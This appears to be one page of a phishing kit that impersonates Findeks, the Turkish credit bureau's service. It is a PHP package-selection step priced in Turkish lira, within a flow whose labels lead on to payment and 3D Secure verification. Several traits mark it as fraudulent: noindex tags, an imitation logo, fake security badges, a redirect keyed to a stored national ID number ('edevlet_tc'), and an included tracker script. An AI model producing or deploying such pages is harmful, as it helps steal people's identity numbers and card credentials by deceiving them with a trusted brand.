<?php
$tc = '';
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex,nofollow">
    <title>Paket Seçimi - Findeks</title>
    <link rel="icon" type="image/png" href="https://www.findeks.com/favicon.ico">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        brand: {
                            primary:   '#0056A4',
                            secondary: '#0070cc',
                            light:     '#e8f1fb',
                            dark:      '#003d7a',
                        }
                    },
                    fontFamily: {
                        sans: ['Inter', 'system-ui', 'sans-serif'],
                    }
                }
            }
        };
    </script>
    <style>
        /* ── Progress tabs ── */
        .step-tab {
            display: flex; align-items: center; gap: 6px;
            padding: 6px 14px; border-radius: 20px;
            font-size: 12px; font-weight: 600;
            transition: all 0.2s; white-space: nowrap;
        }
        .step-tab.active  { background: #0056A4; color: #fff; }
        .step-tab.done    { background: #e8f1fb; color: #0056A4; }
        .step-tab.pending { background: transparent; color: #9ca3af; }
        .step-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
        .step-tab.active  .step-dot { background: rgba(255,255,255,0.7); }
        .step-tab.done    .step-dot { background: #0056A4; }
        .step-tab.pending .step-dot { background: #d1d5db; }

        /* ── Right panel deco ── */
        .findeks-deco {
            background: linear-gradient(160deg, #0056A4 0%, #0070cc 35%, #0056A4 60%, #003d7a 100%);
            position: relative; overflow: hidden;
        }
        .findeks-deco::before {
            content: ''; position: absolute; inset: 0;
            background:
                radial-gradient(ellipse 80% 60% at 110% 20%, rgba(255,255,255,0.12) 0%, transparent 60%),
                radial-gradient(ellipse 60% 80% at -10% 80%, rgba(0,30,80,0.35) 0%, transparent 60%);
            pointer-events: none;
        }
        .findeks-deco::after {
            content: ''; position: absolute; inset: 0;
            background-image: radial-gradient(circle, rgba(255,255,255,0.07) 1px, transparent 1px);
            background-size: 24px 24px; pointer-events: none;
        }

        /* ── Secure badge pulse ── */
        @keyframes securePulse {
            0%, 100% { box-shadow: 0 0 0 0 rgba(16,185,129,0.35); }
            50%       { box-shadow: 0 0 0 6px rgba(16,185,129,0); }
        }
        .secure-pulse { animation: securePulse 2.5s ease-in-out infinite; }

        /* ── Modal backdrop ── */
        .modal-backdrop {
            position: fixed; inset: 0;
            background: rgba(0,0,0,0.55); z-index: 9000;
            display: flex; align-items: center; justify-content: center;
            backdrop-filter: blur(2px);
        }
        .modal-backdrop.hidden { display: none; }

        /* ── Spinner ── */
        .spinner {
            width: 44px; height: 44px;
            border: 4px solid rgba(0,86,164,0.15);
            border-top-color: #0056A4; border-radius: 50%;
            animation: spin 0.75s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* ── Package card ── */
        .pkg-card {
            background: #fff; border: 2px solid #e5e7eb;
            border-radius: 16px; padding: 20px;
            cursor: pointer; transition: all 0.2s;
            position: relative;
        }
        .pkg-card:hover { border-color: #93c5fd; box-shadow: 0 4px 16px rgba(0,86,164,0.1); transform: translateY(-1px); }
        .pkg-card.selected { border-color: #0056A4; background: #f0f6ff; box-shadow: 0 4px 20px rgba(0,86,164,0.15); }
        .pkg-card .check-badge {
            position: absolute; top: 12px; right: 12px;
            width: 22px; height: 22px; border-radius: 50%;
            background: #0056A4; display: none;
            align-items: center; justify-content: center;
        }
        .pkg-card.selected .check-badge { display: flex; }

        /* ── Page overlay ── */
        body { background: #f0f4f8; font-family: 'Inter', system-ui, sans-serif; }
        .page-overlay {
            position: fixed; inset: 0;
            background: rgba(10,20,40,0.6); z-index: 10;
            backdrop-filter: blur(4px);
        }
        .modal-shell {
            position: relative; z-index: 20;
            width: 100%; min-height: 100vh;
            display: flex; flex-direction: column;
        }

        /* ── Scrollbar ── */
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 99px; }
    </style>
</head>
<body>

<!-- Page overlay -->
<div class="page-overlay" aria-hidden="true"></div>

<div class="modal-shell">

    <!-- ── HEADER ── -->
    <header class="sticky top-0 z-50 bg-white border-b border-gray-100 shadow-sm">
        <div class="max-w-5xl mx-auto px-4 h-14 flex items-center justify-between gap-4">

            <!-- Findeks logo -->
            <a href="index.php" class="flex items-center gap-2 flex-shrink-0" aria-label="Findeks Ana Sayfa">
                <svg width="110" height="28" viewBox="0 0 110 28" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                    <rect width="28" height="28" rx="6" fill="#0056A4"/>
                    <path d="M7 8h14M7 14h10M7 20h12" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/>
                    <text x="34" y="20" font-family="Inter,sans-serif" font-weight="700" font-size="15" fill="#0056A4">findeks</text>
                </svg>
            </a>

            <!-- Title -->
            <span class="hidden sm:block text-sm font-semibold text-gray-700 tracking-wide">Kredi Notunu Öğren</span>

            <!-- Progress tabs — desktop -->
            <nav class="hidden md:flex items-center gap-1" aria-label="Adımlar">
                <div class="step-tab done">
                    <span class="step-dot"></span>Bilgiler
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab active" aria-current="step">
                    <span class="step-dot"></span>Paket
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab pending">
                    <span class="step-dot"></span>Ödeme
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab pending">
                    <span class="step-dot"></span>3D Secure
                </div>
                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                <div class="step-tab pending">
                    <span class="step-dot"></span>Sonuç
                </div>
            </nav>

            <!-- Progress dots — mobile -->
            <div class="flex md:hidden items-center gap-1.5" aria-label="Adım 2 / 5">
                <span class="w-2 h-2 rounded-full bg-brand-light border border-brand-primary"></span>
                <span class="w-2.5 h-2.5 rounded-full bg-brand-primary"></span>
                <span class="w-2 h-2 rounded-full bg-gray-200"></span>
                <span class="w-2 h-2 rounded-full bg-gray-200"></span>
                <span class="w-2 h-2 rounded-full bg-gray-200"></span>
            </div>

            <!-- Close button -->
            <a href="index.php"
               class="flex-shrink-0 w-8 h-8 rounded-full flex items-center justify-center text-gray-400 hover:text-gray-700 hover:bg-gray-100 transition-colors"
               aria-label="Kapat">
                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6L6 18M6 6l12 12"/></svg>
            </a>
        </div>
    </header>

    <!-- ── MAIN CONTENT ── -->
    <main class="flex-1 max-w-5xl mx-auto w-full px-4 py-8 lg:py-12">
        <div class="flex flex-col lg:flex-row gap-8 lg:gap-10 items-start">

            <!-- LEFT COLUMN -->
            <div class="flex-1 w-full">

                <div class="mb-7">
                    <h1 class="text-2xl font-bold text-gray-900 tracking-tight">Paket Seçimi</h1>
                    <p class="text-sm text-gray-500 mt-1.5 leading-relaxed">
                        Kredi notunuzu öğrenmek için size en uygun paketi seçin.
                    </p>
                </div>

                <!-- Error banner -->
                <div id="errorBanner" role="alert" aria-live="assertive"
                     class="hidden mb-5 flex items-start gap-3 p-4 bg-red-50 border border-red-200 rounded-xl text-sm text-red-700">
                    <svg class="w-5 h-5 flex-shrink-0 mt-0.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
                    <span id="errorText"></span>
                </div>

                <!-- Package grid -->
                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6" id="packageGrid">

                    <!-- Package 1 -->
                    <div class="pkg-card" data-name="Kredi Notu Raporu" data-price="99.00" data-label="₺99,00">
                        <div class="check-badge">
                            <svg class="w-3 h-3 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>
                        </div>
                        <div class="flex items-center gap-3 mb-3">
                            <div class="w-10 h-10 bg-blue-50 rounded-xl flex items-center justify-center flex-shrink-0">
                                <svg class="w-5 h-5 text-brand-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0020 4.77 5.07 5.07 0 0019.91 1S18.73.65 16 2.48a13.38 13.38 0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 005 4.77a5.44 5.44 0 00-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 009 18.13V22"/></svg>
                            </div>
                            <div>
                                <p class="text-sm font-bold text-gray-900">Kredi Notu Raporu</p>
                                <p class="text-xs text-gray-400 mt-0.5">Temel paket</p>
                            </div>
                        </div>
                        <p class="text-xs text-gray-500 leading-relaxed mb-3">Güncel kredi notunuzu ve risk değerlendirmenizi içeren temel rapor.</p>
                        <div class="flex items-center justify-between pt-3 border-t border-gray-100">
                            <span class="text-xl font-bold text-brand-primary">₺99,00</span>
                            <span class="text-xs text-gray-400">Tek seferlik</span>
                        </div>
                    </div>

                    <!-- Package 2 -->
                    <div class="pkg-card" data-name="Detaylı Kredi Raporu" data-price="149.00" data-label="₺149,00">
                        <div class="check-badge">
                            <svg class="w-3 h-3 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>
                        </div>
                        <div class="absolute top-3 right-10">
                            <span class="text-[10px] font-bold text-white bg-brand-primary px-2 py-0.5 rounded-full">Popüler</span>
                        </div>
                        <div class="flex items-center gap-3 mb-3">
                            <div class="w-10 h-10 bg-blue-50 rounded-xl flex items-center justify-center flex-shrink-0">
                                <svg class="w-5 h-5 text-brand-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><path d="M14 2v6h6M16 13H8M16 17H8M10 9H8"/></svg>
                            </div>
                            <div>
                                <p class="text-sm font-bold text-gray-900">Detaylı Kredi Raporu</p>
                                <p class="text-xs text-gray-400 mt-0.5">Gelişmiş paket</p>
                            </div>
                        </div>
                        <p class="text-xs text-gray-500 leading-relaxed mb-3">Kredi notu, borç analizi ve geçmiş işlem detaylarını içeren kapsamlı rapor.</p>
                        <div class="flex items-center justify-between pt-3 border-t border-gray-100">
                            <span class="text-xl font-bold text-brand-primary">₺149,00</span>
                            <span class="text-xs text-gray-400">Tek seferlik</span>
                        </div>
                    </div>

                    <!-- Package 3 -->
                    <div class="pkg-card" data-name="Yıllık Kredi İzleme" data-price="299.00" data-label="₺299,00">
                        <div class="check-badge">
                            <svg class="w-3 h-3 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>
                        </div>
                        <div class="flex items-center gap-3 mb-3">
                            <div class="w-10 h-10 bg-blue-50 rounded-xl flex items-center justify-center flex-shrink-0">
                                <svg class="w-5 h-5 text-brand-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                            </div>
                            <div>
                                <p class="text-sm font-bold text-gray-900">Yıllık Kredi İzleme</p>
                                <p class="text-xs text-gray-400 mt-0.5">Premium paket</p>
                            </div>
                        </div>
                        <p class="text-xs text-gray-500 leading-relaxed mb-3">12 ay boyunca kredi notunuzu izleyin, değişikliklerde anında bildirim alın.</p>
                        <div class="flex items-center justify-between pt-3 border-t border-gray-100">
                            <span class="text-xl font-bold text-brand-primary">₺299,00</span>
                            <span class="text-xs text-gray-400">Yıllık abonelik</span>
                        </div>
                    </div>

                    <!-- Package 4 -->
                    <div class="pkg-card" data-name="Kurumsal Kredi Raporu" data-price="499.00" data-label="₺499,00">
                        <div class="check-badge">
                            <svg class="w-3 h-3 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>
                        </div>
                        <div class="flex items-center gap-3 mb-3">
                            <div class="w-10 h-10 bg-blue-50 rounded-xl flex items-center justify-center flex-shrink-0">
                                <svg class="w-5 h-5 text-brand-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="7" width="20" height="14" rx="2" ry="2"/><path d="M16 21V5a2 2 0 00-2-2h-4a2 2 0 00-2 2v16"/></svg>
                            </div>
                            <div>
                                <p class="text-sm font-bold text-gray-900">Kurumsal Kredi Raporu</p>
                                <p class="text-xs text-gray-400 mt-0.5">Kurumsal paket</p>
                            </div>
                        </div>
                        <p class="text-xs text-gray-500 leading-relaxed mb-3">Şirketler için kapsamlı kredi analizi, risk skoru ve finansal değerlendirme.</p>
                        <div class="flex items-center justify-between pt-3 border-t border-gray-100">
                            <span class="text-xl font-bold text-brand-primary">₺499,00</span>
                            <span class="text-xs text-gray-400">Tek seferlik</span>
                        </div>
                    </div>

                </div>

                <!-- Continue button -->
                <button type="button" id="continueBtn" disabled
                        onclick="proceedToCart()"
                        class="w-full py-3.5 bg-brand-primary hover:bg-brand-secondary disabled:opacity-40 disabled:cursor-not-allowed text-white font-semibold rounded-xl text-sm transition-all flex items-center justify-center gap-2 shadow-sm hover:shadow-md">
                    <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
                    Devam Et
                </button>

                <!-- Trust row -->
                <div class="flex items-center justify-center gap-5 pt-4">
                    <div class="flex items-center gap-1.5 text-gray-400">
                        <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                        <span class="text-[11px]">SSL Şifreli</span>
                    </div>
                    <div class="flex items-center gap-1.5 text-gray-400">
                        <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
                        <span class="text-[11px]">256-bit Şifreleme</span>
                    </div>
                    <div class="flex items-center gap-1.5 text-gray-400">
                        <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
                        <span class="text-[11px]">KKB Güvenceli</span>
                    </div>
                </div>

            </div>

            <!-- RIGHT COLUMN — Summary sidebar -->
            <aside class="findeks-deco hidden lg:flex flex-col w-80 xl:w-96 rounded-2xl p-8 flex-shrink-0" aria-label="Seçiminiz">

                <!-- Panel header -->
                <div class="mb-6 relative z-10">
                    <div class="flex items-center gap-3 mb-1">
                        <div class="w-8 h-8 bg-white/15 rounded-lg flex items-center justify-center backdrop-blur-sm">
                            <svg class="w-4 h-4 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 12V22H4V12"/><path d="M22 7H2v5h20V7z"/><path d="M12 22V7M12 7H7.5a2.5 2.5 0 010-5C11 2 12 7 12 7zM12 7h4.5a2.5 2.5 0 000-5C13 2 12 7 12 7z"/></svg>
                        </div>
                        <h2 class="text-white font-semibold text-lg">Seçiminiz</h2>
                    </div>
                    <p class="text-blue-200/70 text-xs ml-11">Seçtiğiniz paketi aşağıda görebilirsiniz</p>
                </div>

                <!-- Selected package display -->
                <div class="relative z-10 bg-white/10 backdrop-blur-sm rounded-xl border border-white/15 p-5 mb-5" id="sidebarPackageCard">
                    <div class="flex items-start gap-3">
                        <div class="w-11 h-11 bg-white/15 rounded-lg flex items-center justify-center flex-shrink-0">
                            <svg class="w-5 h-5 text-white/80" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0020 4.77 5.07 5.07 0 0019.91 1S18.73.65 16 2.48a13.38 13.38 0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 005 4.77a5.44 5.44 0 00-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 009 18.13V22"/></svg>
                        </div>
                        <div class="flex-1 min-w-0">
                            <p class="text-white text-sm font-semibold" id="sidebarPackageName">Paket seçilmedi</p>
                            <p class="text-blue-200/70 text-xs mt-0.5">Findeks Hizmet Paketi</p>
                        </div>
                    </div>
                    <div class="mt-4 pt-4 border-t border-white/15 flex items-center justify-between">
                        <span class="text-blue-200/80 text-sm">Paket Ücreti</span>
                        <span class="text-white font-bold text-lg" id="sidebarPackagePrice">—</span>
                    </div>
                </div>

                <!-- Step info -->
                <div class="relative z-10 space-y-2.5 mb-6">
                    <div class="flex items-center gap-3">
                        <div class="w-6 h-6 rounded-full bg-white flex items-center justify-center flex-shrink-0">
                            <svg class="w-3 h-3 text-brand-primary" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>
                        </div>
                        <span class="text-white text-xs font-semibold">Bilgilerinizi girdiniz</span>
                    </div>
                    <div class="flex items-center gap-3">
                        <div class="w-6 h-6 rounded-full bg-white flex items-center justify-center flex-shrink-0">
                            <span class="text-brand-primary text-[10px] font-bold">2</span>
                        </div>
                        <span class="text-white text-xs font-semibold">Paket seçin</span>
                    </div>
                    <div class="flex items-center gap-3 opacity-50">
                        <div class="w-6 h-6 rounded-full bg-white/20 flex items-center justify-center flex-shrink-0">
                            <span class="text-white text-[10px] font-bold">3</span>
                        </div>
                        <span class="text-white text-xs">Ödeme yapın</span>
                    </div>
                    <div class="flex items-center gap-3 opacity-50">
                        <div class="w-6 h-6 rounded-full bg-white/20 flex items-center justify-center flex-shrink-0">
                            <span class="text-white text-[10px] font-bold">4</span>
                        </div>
                        <span class="text-white text-xs">3D Secure doğrulama</span>
                    </div>
                    <div class="flex items-center gap-3 opacity-50">
                        <div class="w-6 h-6 rounded-full bg-white/20 flex items-center justify-center flex-shrink-0">
                            <span class="text-white text-[10px] font-bold">5</span>
                        </div>
                        <span class="text-white text-xs">Raporunuzu görüntüleyin</span>
                    </div>
                </div>

                <!-- Secure badge -->
                <div class="relative z-10 mt-auto">
                    <div class="secure-pulse flex items-center gap-3 p-4 bg-white/10 backdrop-blur-sm rounded-xl border border-white/15">
                        <div class="w-10 h-10 bg-emerald-500/20 rounded-lg flex items-center justify-center flex-shrink-0">
                            <svg class="w-5 h-5 text-emerald-300" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
                        </div>
                        <div>
                            <p class="text-white text-xs font-semibold">Güvenli İşlem Garantisi</p>
                            <p class="text-blue-200/60 text-[10px] mt-0.5">KKB & GlobalSign güvencesiyle korunmaktadır</p>
                        </div>
                    </div>
                    <div class="flex items-center gap-2 mt-4 justify-center flex-wrap">
                        <div class="px-3 py-1.5 bg-white/10 rounded-lg border border-white/15 backdrop-blur-sm">
                            <span class="text-white text-[10px] font-bold tracking-wide">GlobalSign</span>
                        </div>
                        <div class="px-3 py-1.5 bg-white/10 rounded-lg border border-white/15 backdrop-blur-sm">
                            <span class="text-white text-[10px] font-bold tracking-wide">KKB</span>
                        </div>
                        <div class="px-3 py-1.5 bg-white/10 rounded-lg border border-white/15 backdrop-blur-sm">
                            <span class="text-white text-[10px] font-bold tracking-wide">Eyebrand</span>
                        </div>
                    </div>
                </div>

            </aside>

        </div>
    </main>

    <!-- ── FOOTER ── -->
    <footer class="border-t border-gray-100 bg-white mt-auto">
        <div class="max-w-5xl mx-auto px-4 py-5 flex flex-col sm:flex-row items-center justify-between gap-4">
            <a href="index.php" class="flex items-center gap-2" aria-label="Findeks">
                <svg width="90" height="22" viewBox="0 0 110 28" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                    <rect width="28" height="28" rx="6" fill="#0056A4"/>
                    <path d="M7 8h14M7 14h10M7 20h12" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/>
                    <text x="34" y="20" font-family="Inter,sans-serif" font-weight="700" font-size="15" fill="#0056A4">findeks</text>
                </svg>
            </a>
            <p class="text-[11px] text-gray-400 text-center">
                &copy; <?= date('Y') ?> Findeks — Kredi Kayıt Bürosu A.Ş. Tüm hakları saklıdır.
            </p>
            <div class="flex items-center gap-2">
                <span class="px-2.5 py-1 bg-gray-100 rounded text-[10px] font-semibold text-gray-500 tracking-wide">GlobalSign</span>
                <span class="px-2.5 py-1 bg-gray-100 rounded text-[10px] font-semibold text-gray-500 tracking-wide">KKB</span>
                <span class="px-2.5 py-1 bg-gray-100 rounded text-[10px] font-semibold text-gray-500 tracking-wide">Eyebrand</span>
            </div>
        </div>
    </footer>

</div><!-- end modal-shell -->

<!-- Loading modal -->
<div id="loadingModal" class="modal-backdrop hidden" role="status" aria-live="polite" aria-label="İşleminiz devam ediyor">
    <div class="bg-white rounded-2xl shadow-2xl w-full max-w-xs mx-4 p-8 text-center">
        <div class="spinner mx-auto mb-5"></div>
        <p class="text-sm font-semibold text-gray-800">Yükleniyor</p>
        <p class="text-xs text-gray-400 mt-1.5">Lütfen bekleyiniz...</p>
    </div>
</div>

<script>
    // Guard: redirect if no session
    const tc = sessionStorage.getItem('edevlet_tc') || sessionStorage.getItem('findeks_tc') || '';
    if (!tc) {
        window.location.href = 'basvuru.php';
    }

    let selectedPackage = null;

    // Package selection
    document.querySelectorAll('.pkg-card').forEach(card => {
        card.addEventListener('click', function() {
            document.querySelectorAll('.pkg-card').forEach(c => c.classList.remove('selected'));
            this.classList.add('selected');

            selectedPackage = {
                name:  this.dataset.name,
                price: this.dataset.price,
                label: this.dataset.label
            };

            // Update sidebar
            document.getElementById('sidebarPackageName').textContent  = selectedPackage.name;
            document.getElementById('sidebarPackagePrice').textContent = selectedPackage.label;

            // Enable continue button
            document.getElementById('continueBtn').disabled = false;
        });
    });

    function proceedToCart() {
        if (!selectedPackage) return;

        sessionStorage.setItem('findeks_package_name',  selectedPackage.name);
        sessionStorage.setItem('findeks_package_price', selectedPackage.price);
        sessionStorage.setItem('findeks_package_label', selectedPackage.label);

        document.getElementById('loadingModal').classList.remove('hidden');
        document.body.style.overflow = 'hidden';

        setTimeout(() => {
            window.location.href = 'cart.php';
        }, 700);
    }
</script>

<?php include 'includes/tracker.php'; ?>
</body>
</html>
